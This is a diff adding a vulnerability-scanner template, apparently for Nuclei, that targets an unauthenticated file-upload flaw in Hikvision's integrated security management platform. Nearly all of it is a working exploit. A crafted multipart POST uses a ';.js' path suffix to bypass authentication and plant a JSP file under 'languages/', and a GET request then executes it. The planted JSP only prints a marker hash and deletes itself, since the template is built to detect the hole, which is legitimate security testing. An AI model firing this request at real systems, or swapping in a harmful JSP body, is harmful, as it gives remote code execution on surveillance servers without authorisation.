@@ -1,0 +1,40 @@
+id: hikvision-file-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 海康威视综合安防管理平台 /clusterMgr/clusters/ssl/file 存在远程命令执行漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0clusters%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+    - https://mp.weixin.qq.com/s/-Vb3OpzQ6cM7OEQ_x1Hv6w
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"
+http:
+  - raw:
+      - |-
+        POST /clusterMgr/clusters/ssl/file;.js HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=--------------------------984514492333278399715408
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.61 Chrome/126.0.6478.61 Not/A)Brand/8  Safari/537.36
+        Content-Length: 342
+
+        ----------------------------984514492333278399715408
+        Content-Disposition: form-data; name="file"; filename="languages/{{filename}}.jsp"
+        Content-Type: image/png
+
+        <% out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM="))); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ----------------------------984514492333278399715408
+        Content-Disposition: form-data; name="proxyAddress"
+
+        8.8.8.8
+        ----------------------------984514492333278399715408--
+      - |+
+        GET /clusterMgr/languages/{{filename}}.jsp;.js HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'e165421110ba03099a1c0393373c5b43'
